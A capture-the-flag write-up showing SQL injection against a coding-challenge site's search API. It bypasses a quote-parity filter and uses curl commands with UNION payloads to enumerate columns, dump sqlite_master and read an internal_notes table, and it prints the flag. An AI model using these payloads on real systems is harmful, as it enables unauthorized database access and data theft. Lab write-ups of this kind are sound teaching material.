# The Hidden Test Case -- Web

**Flag:** `isfcr{tw0_sum_h1dd3n_t3st_c4s3_a91c3e7}`
**Tools:** curl
**Scripts:** `solve.sh` is the original sequence of requests that actually recovered the flag
(recovered verbatim from the session transcript).

## Enumeration

Target: `https://isfcrpesu-hidden-test-case.chals.io` (LeetVault). The vulnerable endpoint is
`GET /api/problems?search=<query>`.

```
$ curl -sS "$BASE/api/problems?search=array"
```

## Analysis

The app rejects any query containing an ODD number of single quotes (a naive quote-parity
filter), but an EVEN number sails through completely unsanitised:

```
$ curl -sS -i "$BASE/api/problems?search=%27"                              # odd -> 400
$ curl -sS -i "$BASE/api/problems?search=%27%20OR%20%271%27%3D%271"        # even -> 200
```

That's enough to break out of the underlying `LIKE` clause with a UNION-based injection. A
`NULL`-column probe confirmed the query returns exactly 4 columns:

```
$ curl -sS "$BASE/api/problems?search=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%2CNULL--%20%27"
```

## Exploit

Dumped the schema via `sqlite_master` to find the real table:

```
$ curl -sS "$BASE/api/problems?search=%27%20UNION%20SELECT%20name%2Ctype%2Csql%2C1%20FROM%20sqlite_master--%20%27"
```

That revealed an `internal_notes` table. Pulled it directly through the same UNION, using an
even number of quotes to stay under the filter:

```
$ curl -sS "$BASE/api/problems?search=%27%20UNION%20SELECT%20id%2Cnote_type%2Ccontent%2Ccreated_at%20FROM%20internal_notes--%20%27" \
  | grep -o 'isfcr{[^}"]*}'
```

## Verification

The flag came back directly in the `internal_notes.content` column of the UNION response.
